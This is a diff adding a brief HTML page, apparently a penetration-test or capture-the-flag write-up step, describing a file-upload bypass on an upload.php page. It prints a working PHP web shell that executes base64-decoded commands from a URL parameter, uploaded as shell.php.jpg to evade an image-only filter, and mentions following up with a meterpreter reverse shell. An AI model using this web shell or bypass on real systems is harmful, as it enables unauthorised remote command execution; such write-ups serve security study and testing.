@@ -1,0 +1,15 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Shell Upload</title>
+</head><body>After successful login, there upload.php page which has file upload functionlaity.<br/>
+<br/>
+Only png,jpg,gif files are accepted.<br/>
+<br/>
+Uploaded below simple php shell with double extension (shell.php.jpg) to bypass validation<br/>
+<br/>
+&lt;?php echo shell_exec(base64_decode($_GET['cmd'])) ?&gt;<br/>
+<br/>
+create a meterpreter reverse shell<br/>
+</body></html>
